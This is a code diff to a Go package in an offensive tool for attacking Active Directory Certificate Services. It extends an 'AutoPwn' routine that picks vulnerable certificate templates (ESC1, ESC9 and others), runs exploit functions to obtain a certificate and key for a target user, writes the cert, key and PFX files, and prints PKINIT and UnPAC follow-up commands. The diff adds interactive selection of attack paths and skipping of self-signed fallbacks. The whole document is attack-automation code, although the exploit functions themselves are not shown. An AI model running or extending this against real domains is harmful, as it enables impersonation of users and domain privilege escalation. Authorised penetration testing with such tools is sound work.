@@ -1,22 +1,25 @@
 package pki
 
 import (
-	"crypto/ecdsa"
+	"bufio"
+	"crypto"
 	"crypto/x509"
 	"fmt"
 	"os"
 	"path/filepath"
 	"sort"
+	"strconv"
 	"strings"
 )
 
 // AutoPwnConfig holds parameters for the auto-pwn orchestration engine.
 type AutoPwnConfig struct {
 	*ADCSConfig
-	TargetUPN  string
-	AttackerDN string // needed for ESC9
-	OutputDir  string
-	DryRun     bool
+	TargetUPN   string
+	AttackerDN  string // needed for ESC9
+	OutputDir   string
+	DryRun      bool
+	Interactive bool // prompt user to select which ESC path(s) to try
 }
 
 // AutoPwnResult holds the outcome of a successful auto-pwn run.
@@ -78,6 +81,14 @@ func AutoPwn(cfg *AutoPwnConfig) (*AutoPwnResult, error) {
 	}
 	fmt.Println()
 
+	// Interactive path selection
+	if cfg.Interactive && !cfg.DryRun {
+		candidates = promptPathSelection(candidates)
+		if len(candidates) == 0 {
+			return nil, fmt.Errorf("no paths selected")
+		}
+	}
+
 	// Step 3: Dry run — print the plan and exit
 	if cfg.DryRun {
 		fmt.Println("[*] DRY RUN — no exploitation attempted")
@@ -137,6 +148,13 @@ func AutoPwn(cfg *AutoPwnConfig) (*AutoPwnResult, error) {
 			continue
 		}
 
+		// Check if the cert is self-signed (offline fallback) — skip and try next path
+		if IsSelfSigned(cert) {
+			fmt.Printf("[!] %s on %q produced a self-signed cert (CA enrollment failed) — skipping\n", c.escType, c.templateName)
+			fmt.Println("[*] Trying next path...")
+			continue
+		}
+
 		// Step 5: Write output files
 		result, writeErr := writeAutoPwnOutput(cfg, c, cert, key)
 		if writeErr != nil {
@@ -144,7 +162,7 @@ func AutoPwn(cfg *AutoPwnConfig) (*AutoPwnResult, error) {
 			continue
 		}
 
-		// Step 6: Print PKINIT commands for next step
+		// Step 6: Print PKINIT + UnPAC commands for next step
 		fmt.Printf("\n[+] AutoPwn SUCCESS via %s on template %q\n\n", c.escType, c.templateName)
 		PrintPKINITCommands(&PKINITInfo{
 			CertPath:  result.CertPath,
@@ -154,6 +172,9 @@ func AutoPwn(cfg *AutoPwnConfig) (*AutoPwnResult, error) {
 			Domain:    cfg.Domain,
 			TargetUPN: cfg.TargetUPN,
 		})
+		if result.PFXPath != "" {
+			PrintUnPACCommands(result.PFXPath, cfg.TargetDC, cfg.Domain, cfg.TargetUPN)
+		}
 
 		return result, nil
 	}
@@ -250,7 +271,7 @@ func buildCandidates(cfg *AutoPwnConfig, result *EnumerationResult) []escCandida
 }
 
 // executeExploit dispatches to the appropriate exploit function based on ESC type.
-func executeExploit(cfg *AutoPwnConfig, c escCandidate) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func executeExploit(cfg *AutoPwnConfig, c escCandidate) (*x509.Certificate, crypto.Signer, error) {
 	switch c.escType {
 	case "ESC1":
 		return ExploitESC1(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
@@ -274,7 +295,7 @@ func executeExploit(cfg *AutoPwnConfig, c escCandidate) (*x509.Certificate, *ecd
 }
 
 // writeAutoPwnOutput writes cert, key, and PFX files to the output directory.
-func writeAutoPwnOutput(cfg *AutoPwnConfig, c escCandidate, cert *x509.Certificate, key *ecdsa.PrivateKey) (*AutoPwnResult, error) {
+func writeAutoPwnOutput(cfg *AutoPwnConfig, c escCandidate, cert *x509.Certificate, key crypto.Signer) (*AutoPwnResult, error) {
 	// Use UPN username as base, with ESC type suffix for disambiguation
 	upnUser := cfg.TargetUPN
 	if idx := strings.Index(upnUser, "@"); idx > 0 {
@@ -312,4 +333,48 @@ func writeAutoPwnOutput(cfg *AutoPwnConfig, c escCandidate, cert *x509.Certifica
 	}
 
 	return result, nil
+}
+
+// promptPathSelection presents an interactive menu for the user to choose
+// which attack paths to attempt. Returns the filtered/reordered candidates.
+func promptPathSelection(candidates []escCandidate) []escCandidate {
+	fmt.Println("[?] Select path(s) to attempt:")
+	fmt.Println("    Enter number(s) separated by commas (e.g. 1,3,5)")
+	fmt.Println("    Enter 'all' to try all paths in order")
+	fmt.Println("    Enter 'q' to abort")
+	fmt.Print("\n    Selection: ")
+
+	scanner := bufio.NewScanner(os.Stdin)
+	if !scanner.Scan() {
+		return candidates // EOF — use all
+	}
+	input := strings.TrimSpace(scanner.Text())
+
+	if input == "" || strings.EqualFold(input, "all") {
+		fmt.Println("[*] Trying all paths in priority order")
+		return candidates
+	}
+	if strings.EqualFold(input, "q") || strings.EqualFold(input, "quit") {
+		return nil
+	}
+
+	var selected []escCandidate
+	parts := strings.Split(input, ",")
+	for _, p := range parts {
+		p = strings.TrimSpace(p)
+		idx, err := strconv.Atoi(p)
+		if err != nil || idx < 1 || idx > len(candidates) {
+			fmt.Printf("[!] Invalid selection %q (valid: 1-%d)\n", p, len(candidates))
+			continue
+		}
+		selected = append(selected, candidates[idx-1])
+	}
+
+	if len(selected) == 0 {
+		fmt.Println("[!] No valid paths selected — aborting")
+		return nil
+	}
+
+	fmt.Printf("[*] Selected %d path(s)\n\n", len(selected))
+	return selected
 }
